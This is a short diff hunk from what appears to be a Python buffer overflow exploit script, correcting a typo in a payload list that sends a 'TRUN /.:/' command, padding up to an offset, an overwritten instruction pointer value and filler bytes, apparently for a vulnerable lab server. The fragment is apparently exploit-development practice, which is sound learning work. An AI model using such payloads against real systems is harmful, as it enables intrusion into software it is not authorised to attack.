@@ -13,7 +13,7 @@ try:
 
     payload = [
         b"TRUN /.:/",
-        b"A" * offset.
+        b"A" * offset,
         new_eip,
         b"C" * 976
     ]
